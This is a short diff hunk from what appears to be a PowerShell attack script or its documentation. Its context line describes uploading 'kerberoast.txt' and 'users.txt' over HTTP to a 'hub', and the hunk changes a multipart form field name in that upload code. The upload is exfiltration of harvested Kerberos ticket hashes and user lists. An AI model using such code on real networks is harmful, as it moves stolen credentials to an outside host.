@@ -272,7 +272,7 @@ Upload the files 'kerberoast.txt' and 'users.txt' via HTTP back to the hub.
 
         $bodyLines = (
             "--$boundary",
-            "Content-Disposition: form-data; name=`"file`"; filename=`"$file`"",
+            "Content-Disposition: form-data; name=`"file[]`"; filename=`"$file`"",
             "Content-Type: application/octet-stream$LF",
             $fileEnc,
             "--$boundary--$LF"
